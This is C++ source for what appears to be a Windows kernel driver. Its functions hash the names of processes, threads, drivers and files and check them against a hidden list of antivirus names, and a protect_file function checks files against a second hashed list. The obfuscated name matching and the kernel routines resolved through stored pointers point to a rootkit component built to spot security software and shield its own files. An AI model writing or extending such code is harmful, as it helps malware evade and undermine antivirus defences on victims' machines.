#include "includes.h"
#include "modules.h"
#include "nt_structs.h"
#include "log.h"
#include "hooks.h"
#include "helpers.h"

static bool check_against_hashes( const wchar_t* name_start, const UINT64* hash_list, SIZE_T count ) {
    if ( !name_start )  return false;

    UINT64 hash_val = hash::salted_hash_string_ci( name_start, helpers::wcslen( name_start ) );

    for ( SIZE_T i = 0; i < count; ++i ) {
        if ( hash_val == hash_list[i] ) return true;
    }

    return false;
}

static bool from_process_image( PEPROCESS process, const UINT64* hash_list, SIZE_T count ) {
    if ( !process || !globals::stored_three )   return false;

    auto fn_image = reinterpret_cast< PsGetProcessImageFileName_t >( globals::stored_three );
    auto* ansi_name = fn_image( process );
    
    if ( !ansi_name )   return false;

    wchar_t wide_buffer[260] = { 0 };
    auto len = helpers::ansi_to_wide( reinterpret_cast< const char* >( ansi_name ), wide_buffer, RTL_NUMBER_OF( wide_buffer ) );

    auto* name_start = helpers::FindFilenameStart( wide_buffer, len );

    return check_against_hashes( name_start, hash_list, count );
}

static bool from_unicode_string( const UNICODE_STRING& unicode, const UINT64* hash_list, SIZE_T count ) {
    if ( !unicode.Buffer )  return false;
    auto* name_start = helpers::FindFilenameStart( unicode.Buffer, helpers::wcslen( unicode.Buffer ) );
    
    return check_against_hashes( name_start, hash_list, count );
}

static bool from_file_object( FILE_OBJECT* file_object, const UINT64* hash_list, SIZE_T count ) {
    return from_unicode_string( file_object->FileName, hash_list, count );
}

static bool extract_thread_name( PETHREAD thread, const UINT64* hash_list, SIZE_T count ) {
    if ( !thread || !globals::stored_three || !globals::stored_four )   return false;

    auto fn_thread_to_proc = reinterpret_cast< IoThreadToProcess_t >( globals::stored_four );
    auto process = fn_thread_to_proc( thread );

    return from_process_image( process, hash_list, count );
}


bool AV::extract_process_name( PEPROCESS process ) {
    return from_process_image( process, globals::AV_Hashes, RTL_NUMBER_OF( globals::AV_Hashes ) );
}

bool AV::extract_symlink_name( PEPROCESS process ) {
    return from_process_image( process, globals::AV_Hashes, RTL_NUMBER_OF( globals::AV_Hashes ) );
}

bool AV::extract_directory_name( PEPROCESS process ) {
    return from_process_image( process, globals::AV_Hashes, RTL_NUMBER_OF( globals::AV_Hashes ) );
}

bool AV::extract_thread_name( PETHREAD thread ) {
    return extract_thread_name( thread, globals::AV_Hashes, RTL_NUMBER_OF( globals::AV_Hashes ) );
}

bool AV::extract_driver_name( PDRIVER_OBJECT driver_object ) {
    return from_unicode_string( driver_object->DriverName, globals::AV_Hashes, RTL_NUMBER_OF( globals::AV_Hashes ) );
}

bool AV::extract_file_name( FILE_OBJECT* file_object ) {
    return from_file_object( file_object, globals::AV_Hashes, RTL_NUMBER_OF( globals::AV_Hashes ) );
}

bool AV::protect_file( FILE_OBJECT* file_object ) {
    return from_file_object( file_object, globals::Hashed_Names, RTL_NUMBER_OF( globals::Hashed_Names ) );
}